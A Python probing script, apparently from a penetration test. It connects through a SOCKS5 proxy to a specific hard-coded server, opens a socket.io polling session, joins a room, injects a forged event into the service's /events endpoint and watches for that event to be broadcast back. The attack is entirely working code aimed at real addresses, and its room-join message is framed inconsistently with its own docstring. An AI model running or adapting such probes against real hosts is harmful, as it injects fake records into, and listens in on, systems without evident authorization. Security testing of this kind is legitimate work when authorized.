#!/usr/bin/env python3
"""Join a room via socket.io and test if events are pushed to that room.
Socket.io v3+ uses message frames to join rooms:
- Client -> Server: 42["join","ROOMNAME"] (room join)
- Server -> Client: 42["joined","ROOMNAME"] (confirmation)
"""
import socket, struct, json, time, sys, re

PROXY = ("202.160.76.157", 11082)
DEST = ("35.234.50.28", 3100)

def socks_tunnel():
    s = socket.create_connection(PROXY, timeout=15)
    s.sendall(b"\x05\x01\x00")
    s.recv(4)
    hb = b"35.234.50.28"
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb + struct.pack(">H", 3100))
    s.settimeout(20)
    rep = b""
    while len(rep) < 4:
        c = s.recv(16)
        if not c: break
        rep += c
    if len(rep) < 2 or rep[1] != 0:
        s.close()
        return None
    return s

def http_req(s, method, path, body=None, headers=None):
    s.settimeout(20)
    h = headers or {}
    r = f"{method} {path} HTTP/1.1\r\nHost: 35.234.50.28:3100\r\nConnection: keep-alive\r\n"
    if body is not None:
        r += f"Content-Type: application/json\r\nContent-Length: {len(body.encode())}\r\n"
    for k, v in h.items():
        r += f"{k}: {v}\r\n"
    r += "\r\n"
    if body is not None:
        r += body
    s.sendall(r.encode())
    buf = b""
    try:
        while b"\r\n\r\n" not in buf:
            d = s.recv(65536)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    if b"\r\n\r\n" in buf:
        head, body2 = buf.split(b"\r\n\r\n", 1)
        m = re.search(rb"content-length:\s*(\d+)", head, re.I)
        if m:
            need = int(m.group(1))
            while len(body2) < need:
                try:
                    d = s.recv(65536)
                except socket.timeout:
                    break
                if not d:
                    break
                body2 += d
        return head.decode(errors="replace"), body2.decode(errors="replace")
    return "NO_RESPONSE", ""

print("=== Test: join room and receive broadcast ===\n")

# Step 1: Connect and get sid
print("Step 1: Connect to socket.io")
s1 = socks_tunnel()
if not s1:
    print("FAIL: tunnel"); sys.exit(1)
head1, body1 = http_req(s1, "GET", "/socket.io/?EIO=3&transport=polling")
m = re.search(r'"sid":"([^"]+)"', body1)
if not m:
    print(f"FAIL: no sid. BODY: {body1}"); sys.exit(1)
sid = m.group(1)
print(f"  SID: {sid}")

# Step 2: Join a room (try a few common room names)
print("\nStep 2: Join rooms via socket.io messages")
# Socket.io v3+ message format: 42[EVENT_NAME,DATA]
# For room join: 42["join","ROOMNAME"]
# We need to send this as an engine.io message frame: 4{json}
# But in polling mode, we send it as a POST body

# Try joining a room with the CaseID we're about to create
case_id = "PENTEST_ROOM_TEST_2026_0915"
print(f"  Joining room: {case_id}")
join_msg = json.dumps(["join", case_id])
engine_msg = f'4"{join_msg}"'
head_j, body_j = http_req(s1, "POST", f"/socket.io/?EIO=3&transport=polling&sid={sid}", engine_msg)
print(f"  JOIN HEAD: {head_j.split(chr(10))[0]}")
print(f"  JOIN BODY: {body_j[:200]}")

# Step 3: POST an event with the same CaseID
print("\nStep 3: POST event with CaseID = room name")
s2 = socks_tunnel()
if s2:
    event = {
        "CaseID": case_id,
        "TypeOfEventTxt": "room_test",
        "TypeOfEventNum": 999,
        "Caption": "ROOM_TEST_MARKER",
        "Elapsed": 88888,
        "Value": "ROOM_MARKER",
        "Annotation": "Testing room-based broadcast"
    }
    body_json = json.dumps(event)
    head2, body2 = http_req(s2, "POST", "/events", body_json)
    print(f"  POST status: {head2.split(chr(10))[0]}")
    print(f"  POST body: {body2[:200]}")
    s2.close()

# Step 4: Poll for 20s to see if the event is pushed to our room
print("\nStep 4: Poll for 20s to see if event is pushed to room")
s1.settimeout(20)
found = False
try:
    while True:
        d = s1.recv(65536)
        if not d:
            break
        text = d.decode(errors="replace")
        print(f"  RECV: {text[:500]}")
        if case_id in text or "ROOM_MARKER" in text:
            print("\n  *** ROOM BROADCAST CONFIRMED! ***")
            found = True
            break
except socket.timeout:
    print("\n  Timeout: no events received in 20s")

if not found:
    print("  No room-based broadcast detected.")

s1.close()
print("\n=== DONE ===")
